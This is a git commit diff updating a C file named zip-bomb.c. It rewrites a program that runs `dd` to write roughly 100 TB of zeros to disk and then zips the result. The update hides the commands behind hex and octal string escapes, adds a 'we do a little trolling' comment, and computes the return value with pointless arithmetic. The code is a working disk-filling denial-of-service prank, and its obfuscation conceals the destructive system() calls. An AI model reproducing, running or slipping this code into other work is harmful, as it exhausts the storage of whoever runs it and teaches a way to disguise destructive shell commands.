8dcf6cff0616e2397c9159d7a080109beb12e52a
zoomer <51061101+calebrwalk5@users.noreply.github.com>
2021-10-15 14:55:08 -0400

    Update zip-bomb.c

--- zip-bomb.c
+++ zip-bomb.c
@@ -1,8 +1,8 @@
 #include <stdio.h>
-
+/* we do a little trolling */
 int main() {
-    printf("zip bomb");
-    system("dd if=/dev/zero of=data bs=10G count=10000");
-    system("zip -r data.zip data");
-    return 0;
-}
+    printf("\x7A""i\160 \x62""o\155b");
+    system("\x64""d\040i\x66""=\057d\x65""v\057z\x65""r\157 \x6F""f\075d\x61""t\141 \x62""s\0751\x30""G\040c\x6F""u\156t\x3D""1\0600\x30""0");
+    system("\x7A""i\160 \x2D""r\040d\x61""t\141.\x7A""i\160 \x64""a\164a");
+    return(0x0000000000000000 + 0x0000000000000200 + 0x0000000000000800 - 0x0000000000000A00);
+};
